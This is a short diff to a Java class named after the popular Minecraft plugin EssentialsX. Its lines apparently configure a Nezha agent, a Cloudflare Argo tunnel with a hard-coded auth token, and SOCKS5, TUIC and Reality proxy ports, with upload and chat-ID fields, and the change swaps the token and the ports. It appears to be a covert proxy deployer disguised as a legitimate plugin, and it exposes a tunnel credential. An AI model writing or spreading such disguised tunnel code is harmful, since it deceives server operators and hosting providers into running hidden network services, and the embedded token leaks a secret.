@@ -80,12 +80,12 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "seedloaf.free.us.kg");
-        env.put("ARGO_AUTH", "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiYjJhYWQ2ZDItMzNhYS00YTY5LWJmNjItODg3MDU1Y2ZjMmFhIiwicyI6Ik4yRmlZMlV6WldVdE9EVTBNUzAwTlRNekxUZ3dNekV0TVRnM1lqWmxORGt5TldaaSJ9");
-        env.put("S5_PORT", "19132");
+        env.put("ARGO_AUTH", "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiMTU3NjFlZTYtODMwNy00ZDY1LTg3ZDAtYmZmMjcxN2E0ZjE2IiwicyI6IllqTTJaRFJpWkRBdE9ESmxOUzAwTkRnekxXRXlOR010TXpKalpqWTRaRGRsTmpjeCJ9");
+        env.put("S5_PORT", "24903");
         env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "19132");
+        env.put("TUIC_PORT", "24903");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "19133");
+        env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
